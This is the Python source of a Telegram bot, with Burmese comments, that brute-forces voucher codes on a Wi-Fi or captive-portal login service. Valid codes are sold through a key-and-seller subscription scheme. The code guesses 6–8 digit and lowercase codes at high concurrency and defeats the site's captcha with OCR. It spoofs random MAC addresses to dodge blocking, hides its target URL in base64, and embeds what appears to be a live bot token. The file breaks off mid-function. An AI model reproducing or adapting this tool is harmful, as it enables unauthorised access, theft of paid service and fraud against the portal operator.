import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, aiofiles
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse, parse_qs

# ------------------------- CONFIG -------------------------
BOT_TOKEN = "8942457020:AAGcDUgoDArkvl8m9IbIoDaFwJdF8g2WbrU"
ADMIN_ID =  "8181084923"  # အဓိက Admin
AUTH_FILE = "1.json"      # Key စာရင်း
RESULT_FILE = "2.json"  # Success Code စာရင်း
SELLERS_FILE = "3.json"# Seller စာရင်း
ADMIN_CONTACT = "tg username"   # Admin ဆက်သွယ်ရန် Username
# ---------------------------------------------------------

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}        # {chat_id: [{"code": code, "plan": plan}]}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 500         # မြန်လွန်းရင် block ခံရနိုင်လို့ လျှော့ထားတယ်
_voucher_sem = None
_start_time = time.monotonic()
found_count = {}
retry_count = {}

# ---------- Local storage with locks ----------
auth_list = {}
result = {}
sellers = {}
auth_lock = asyncio.Lock()
result_lock = asyncio.Lock()
sellers_lock = asyncio.Lock()
SUCCESS_CODE = asyncio.Queue()

# ---------- Load / Save Functions ----------
async def load_auth_list():
    global auth_list
    try:
        async with aiofiles.open(AUTH_FILE, 'r') as f:
            auth_list = json.loads(await f.read())
    except FileNotFoundError:
        auth_list = {}
        await save_auth_list()
    except:
        auth_list = {}

async def save_auth_list():
    async with auth_lock:
        async with aiofiles.open(AUTH_FILE, 'w') as f:
            await f.write(json.dumps(auth_list, indent=2))

async def load_result():
    global result
    try:
        async with aiofiles.open(RESULT_FILE, 'r') as f:
            result = json.loads(await f.read())
    except FileNotFoundError:
        result = {}
        await save_result()
    except:
        result = {}

async def save_result():
    async with result_lock:
        async with aiofiles.open(RESULT_FILE, 'w') as f:
            await f.write(json.dumps(result, indent=2))

async def load_sellers():
    global sellers
    try:
        async with aiofiles.open(SELLERS_FILE, 'r') as f:
            data = json.loads(await f.read())
            sellers = data.get("sellers", {})
    except FileNotFoundError:
        sellers = {}
        await save_sellers()
    except:
        sellers = {}

async def save_sellers():
    async with sellers_lock:
        async with aiofiles.open(SELLERS_FILE, 'w') as f:
            await f.write(json.dumps({"sellers": sellers}, indent=2))

# ---------- Permission Helper ----------
def check_expiration(expires_at):
    if expires_at == "9999-12-31T23:59:59Z":
        return True
    try:
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False

def is_authorized(chat_id):
    chat_id_str = str(chat_id)
    if chat_id_str == ADMIN_ID:
        return True
    if chat_id_str in sellers:
        seller_data = sellers[chat_id_str]
        expires_at = seller_data.get("expires_at", "2000-01-01T00:00:00Z")
        return check_expiration(expires_at)
    return False

def unauthorized_message():
    return f"❌ ခွင့်ပြုချက်မရှိပါ။ ကျေးဇူးပြု၍ Admin {ADMIN_CONTACT} ကို ဆက်သွယ်ပါ။"

# ---------- Key Expiry Helpers ----------
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm, second=0, tzinfo=timezone.utc)
        return datetime.now(timezone.utc) < expiration_dt
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_remaining_time(expires_at):
    if expires_at == "9999-12-31T23:59:59Z":
        return "Unlimited"
    try:
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        if exp_time <= now:
            return "Expired"
        diff = exp_time - now
        days = diff.days
        hours, rem = divmod(diff.seconds, 3600)
        minutes = rem // 60
        if days > 0:
            return f"{days}d {hours}h {minutes}m"
        else:
            return f"{hours}h {minutes}m"
    except:
        return "Unknown"

# ------------------- WEB SERVER -------------------
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ------------------- BOT COMMANDS -------------------
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် command များကို ကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_command(message):
    help_text = (
        "🤖 **Random_Tool_Bot Command List**\n\n"
        "🔹 **User Commands** (key required unless Admin/Seller):\n"
        "  `/key` – သင်၏ key ကို ထည့်သွင်းရန်\n"
        "  `/input <session_url>` – Session URL ထည့်ရန်\n"
        "  `/scan <6|7|8|ascii-lower|all>` – Code ရှာဖွေရန်\n"
        "  `/stop` – လက်ရှိ scan ကို ရပ်တန့်ရန်\n"
        "  `/result` – သင့်တွေ့ရှိထားသော success code များကို ကြည့်ရန်\n"
        "  `/recheck` – သင့် success code များကို ပြန်လည်စစ်ဆေးရန်\n"
        "  `/checkvoucher` – Voucher code များ၏ အခြေအနေကို စစ်ဆေးရန်\n"
        "  `/mytime` – သင်၏ ကျန်အချိန်ကို ကြည့်ရန် (Seller များအတွက်)\n\n"
        "🔹 **Admin/Seller Commands** (ဤသူများသာ သုံးနိုင်):\n"
        "  `/genkey <plan> <user_id>` – Key ထုတ်ပေးရန် (plan: 30m,1h,1d,7d,1m,1y,unlimited)\n"
        "  `/delkey <user_id>` – Key ဖျက်ရန်\n"
        "  `/listkeys` – မှတ်ပုံတင်ထားသော Key စာရင်းကို ကြည့်ရန်\n"
        "  `/status` – Bot အခြေအနေကို ကြည့်ရန်\n\n"
        "🔹 **Admin Only** (အဓိက Admin မှသာ):\n"
        "  `/addseller <user_id> <plan>` – Seller အဖြစ် ထည့်သွင်းရန်\n"
        "  `/removeseller <user_id>` – Seller ကို ဖယ်ရှားရန်\n"
        "  `/listsellers` – Seller စာရင်းနှင့် ကျန်အချိန်ကို ကြည့်ရန်\n"
        "  `/broadcast <message>` – Seller အားလုံးသို့ မက်ဆေ့ချ်ပို့ရန်\n\n"
        "📌 **/checkvoucher အသုံးပြုပုံ**:\n"
        "  `/checkvoucher` နောက်တွင် code များကို အောက်ပါအတိုင်း ကူးထည့်ပါ။\n"
        "  `45-1h`  `053-2h`  `81 - 1d`  `15 - 1mo`\n\n"
        "  ရလဒ်: `✅ Valid`, `⚠️ Limited`, `❌ Invalid/Expired` နှင့် duration ကိုပြသပေးမည်。"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve, auth_list
    chat_id = str(message.chat.id)

    if is_authorized(chat_id):
        approve[message.chat.id] = True
        if message.chat.id not in user_data:
            user_data[message.chat.id] = {}
        await bot.reply_to(message, "✅ Admin/Seller approved. Use /input to start.")
        return

    if chat_id in auth_list:
        valid = check_key_expiration(auth_list[chat_id])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, f"❌ သင်၏ key ကို registered မလုပ်ရသေးပါ။ ကျေးဇူးပြု၍ Admin {ADMIN_CONTACT} ကို ဆက်သွယ်ပါ။")

@bot.message_handler(commands=['mytime'])
async def mytime(message):
    chat_id = str(message.chat.id)
    if chat_id in sellers:
        seller_data = sellers[chat_id]
        expires_at = seller_data.get("expires_at", "2000-01-01T00:00:00Z")
        plan = seller_data.get("plan", "Unknown")
        remaining = get_remaining_time(expires_at)
        await bot.reply_to(message, f"📅 **Your Seller Info**\nPlan: {plan}\nRemaining Time: {remaining}", parse_mode="Markdown")
    else:
        await bot.reply_to(message, "You are not a seller.")

# ---------- Admin-only Seller Management ----------
@bot.message_handler(commands=['addseller'])
async def add_seller(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/addseller <user_id> <plan>\nPlans: 30m,1h,1d,7d,1m,1y,unlimited")
            return
        user_id = args[1]
        plan = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Invalid plan. Use: 30m,1h,1d,7d,1m,1y,unlimited")
            return
        sellers[user_id] = {"expires_at": expiry, "plan": plan}
        await save_sellers()
        await bot.reply_to(message, f"✅ Seller added successfully!\n\nUser ID: {user_id}\nPlan: {plan}\nExpires: {expiry}")
    except Exception as e:
        print(f"Error at addseller: {e}")

@bot.message_handler(commands=['removeseller'])
async def remove_seller(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/removeseller <user_id>")
            return
        user_id = args[1]
        if user_id in sellers:
            del sellers[user_id]
            await save_sellers()
            await bot.reply_to(message, f"✅ Seller removed successfully!\nUser ID: {user_id}")
        else:
            await bot.reply_to(message, f"User ID {user_id} is not a seller.")
    except Exception as e:
        print(f"Error at removeseller: {e}")

@bot.message_handler(commands=['listsellers'])
async def list_sellers(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return
    if not sellers:
        await bot.reply_to(message, "No sellers registered.")
        return
    lines = []
    for uid, data in sellers.items():
        plan = data.get("plan", "Unknown")
        expires_at = data.get("expires_at", "N/A")
        remaining = get_remaining_time(expires_at)
        lines.append(f"👤 {uid}\n   Plan: {plan}\n   Remaining: {remaining}")
    text = f"📋 **Sellers List ({len(sellers)})**\n\n" + "\n\n".join(lines)
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096], parse_mode="Markdown")
    else:
        await bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
async def broadcast(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/broadcast <message>")
        return
    msg = args[1]
    if not sellers:
        await bot.reply_to(message, "No sellers to broadcast.")
        return
    sent = 0
    for uid in sellers.keys():
        try:
            await bot.send_message(int(uid), f"📢 Admin Message:\n{msg}")
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    await bot.reply_to(message, f"✅ Broadcast sent to {sent} sellers.")

# ---------- Existing Admin/User Commands ----------
@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if not is_authorized(message.chat.id):
        await bot.reply_to(message, unauthorized_message())
        return
    if not auth_list:
        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
        return
    lines = []
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            expires = data.get("expires_at", "unknown")
            plan = data.get("plan", "unknown")
            if expires == "9999-12-31T23:59:59Z":
                expires_str = "Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "Expired"
                    else:
                        diff = exp_dt - now
                        days = diff.days
                        hours, rem = divmod(diff.seconds, 3600)
                        minutes = rem // 60
                        expires_str = f"{days}d {hours}h {minutes}m left"
                except:
                    expires_str = expires
        else:
            plan = "old"
            expires_str = str(data)
        lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
    text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096])
    else:
        await bot.reply_to(message, text)

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_authorized(message.chat.id):
        await bot.reply_to(message, unauthorized_message())
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await save_auth_list()
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : {user_id}")
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_authorized(message.chat.id):
        await bot.reply_to(message, unauthorized_message())
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited")
            return
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        await save_auth_list()
        await bot.reply_to(
            message,
            f"✅ Key Generated\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"EXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    chat_id = str(message.chat.id)
    if is_authorized(chat_id) or chat_id in auth_list:
        if chat_id in result and result[chat_id]:
            codes = "\n".join(result[chat_id])
            await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
        else:
            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
    else:
        await bot.reply_to(message, unauthorized_message())

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not is_authorized(chat_id):
        await bot.reply_to(message, unauthorized_message())
        return
    if chat_id not in user_data:
        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if "session_url" not in user_data[chat_id]:
        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return
    chat_id_str = str(chat_id)
    if chat_id_str in result and result[chat_id_str]:
        codes = result[chat_id_str]
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[chat_id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(
                session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message
            )
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list):
    global result
    result[chat_id_str] = recheck_list
    await save_result()

# ---------- Improved Session URL Check ----------
async def check_session_url(session_url):
    parsed = urlparse(session_url)
    query_params = parse_qs(parsed.query)
    if 'sessionId' in query_params and query_params['sessionId'][0]:
        return True

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22xyz123%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            final_url = str(response.url)
            if "sessionId" in final_url:
                return True
            return False
    except:
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return
    url = args[1]
    if message.chat.id in user_data:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
        else:
            await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>")
        return
    mode = args[1]
    chat_id = message.chat.id
    if not is_authorized(chat_id):
        await bot.reply_to(message, unauthorized_message())
        return
    if chat_id not in user_data:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။")
        return

    found_count[chat_id] = 0
    retry_count[chat_id] = 0
    success_texts[chat_id] = []
    success_messages.pop(chat_id, None)

    progress_msg = await bot.send_message(chat_id, "🔍Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, chat_id, user_data[chat_id]['session_url'], scan_id,
            message=message, progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['status'])
async def status(message):
    if not is_authorized(message.chat.id):
        await bot.reply_to(message, unauthorized_message())
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"🛒 Sellers: {len(sellers)}"
    )

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")

# ---------- Check Voucher Status ----------
async def check_code_status(session_url, code):
    global _connector
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9leGFtcGxlLmNvbS9hcGkvYXV0aC92b3VjaGVyLz9sYW5nPWVuX1VT'
    ).decode()

    for _attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return "invalid"
            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception:
                    continue
            if not auth_code:
                return "invalid"

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "example.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://example.com",
                "referer": f"https://example.com/src/index.html?sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    if 'logonUrl' in response:
                        return "success"
                    elif 'STA' in response:
                        return "limited"
                    else:
                        return "invalid"
            except Exception:
                return "invalid"
    return "invalid"

@bot.message_handler(commands=['checkvoucher'])
async def check_voucher(message):
    chat_id = message.chat.id

    if not is_authorized(chat_id):
        await bot.reply_to(message, unauthorized_message())
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ Please set session URL first using /input.")
        return

    text = message.text
    lines = text.split('\n')
    if len(lines) < 2:
        await bot.reply_to(message, "Usage:\n/checkvoucher \n[Paste your codes list]\n\nExample:\n45-1h\n053-2h\n81 - 1d")
        return

    codes_to_check = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('/'):
            continue
        match = re.search(r'^(\d+)\s*[-–—]?\s*(.*?)\s*([a-zA-Z0-9]+)?$', line)
        if match:
            code = match.group(1)
            middle = match.group(2).strip()
            duration = match.group(3) if match.group(3) else None
            if not duration and middle:
                if re.match(r'^[0-9]+[mhdMy]?$', middle):
                    duration = middle
                else:
                    parts = middle.split()
                    if parts:
                        last = parts[-1]
                        if re.match(r'^[0-9]+[mhdMy]?$', last):
                            duration = last
            if not duration:
                duration = "Unknown"
            codes_to_check.append((code, duration))
        else:
            if re.match(r'^\d+$', line):
                codes_to_check.append((line, "Unknown"))

    if not codes_to_check:
        await bot.reply_to(message, "No valid codes found. Use format:\n45-1h\n053-2h")
        return

    session_url = user_data[chat_id]['session_url']
    await bot.reply_to(message, f"⏳ Checking {len(codes_to_check)} codes... Please wait.")

    results = []
    for code, duration in codes_to_check:
        status = await check_code_status(session_url, code)
        if status == "success":
            results.append(f"✅ {code} - {duration} (Valid)")
        elif status == "limited":
            results.append(f"⚠️ {code} - {duration} (Limited)")
        else:
            results.append(f"❌ {code} - {duration} (Invalid/Expired)")
        await asyncio.sleep(0.2)

    final = "🧾 Voucher Status Check:\n\n" + "\n".join(results)
    if len(final) > 4096:
        for i in range(0, len(final), 4096):
            await bot.send_message(chat_id, final[i:i+4096])
    else:
        await bot.send_message(chat_id, final)

# ---------- Periodic result saver ----------
async def periodic_result_saver():
    global result
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            for item in items:
                chat_id = str(item["chat_id"])
                code = item["code"]
                if chat_id not in result:
                    result[chat_id] = []
                if code not in result[chat_id]:
                    result[chat_id].append(code)
            await save_result()

# ---------- Bruteforce & captcha functions ----------
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total, speed, found, retry):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (f"🔍Scanning Codes...\n\n"
                f"📦Checked : {checked:,}/{total:,}\n"
                f"📊Progress : {percent:.2f}%\n"
                f"⚡Speed : {speed_str}\n"
                f"✅Found : {found}\n"
                f"🔄Retry : {retry}\n"
                f"[{bar}]")
    return (f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"🔄Retry : {retry}\n"
            f"📊Status : running\n")

BATCH_SIZE = 2000

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    found_count[chat_id] = 0
    retry_count[chat_id] = 0

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                if str(chat_id) == ADMIN_ID:
                    pass
                elif str(chat_id) in sellers:
                    if not is_authorized(chat_id):
                        approve[chat_id] = False
                        await bot.send_message(chat_id, "သင်၏ Seller သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        success_messages.pop(chat_id, None)
                        success_texts.pop(chat_id, None)
                        return
                else:
                    await load_auth_list()
                    if str(chat_id) not in auth_list or not check_key_expiration(auth_list[str(chat_id)]):
                        approve[chat_id] = False
                        await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        success_messages.pop(chat_id, None)
                        success_texts.pop(chat_id, None)
                        return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found_count.get(chat_id, 0), retry_count.get(chat_id, 0))
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            finish_text = (f"🔍Scanning Completed\n\n"
                           f"📦Checked : {checked:,}\n"
                           f"📊Progress : 100%\n"
                           f"✅Found : {found_count.get(chat_id, 0)}\n"
                           f"🔄Retry : {retry_count.get(chat_id, 0)}\n"
                           f"[██████████████████]")
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")

        if chat_id in success_texts and success_texts[chat_id]:
            code_list = success_texts[chat_id]
            formatted = ", ".join([f"{item['code']}({item['plan']})" for item in code_list])
            await bot.send_message(chat_id, f"✅ Success Codes: {formatted}")

        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        found_count.pop(chat_id, None)
        retry_count.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        found_count.pop(chat_id, None)
        retry_count.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
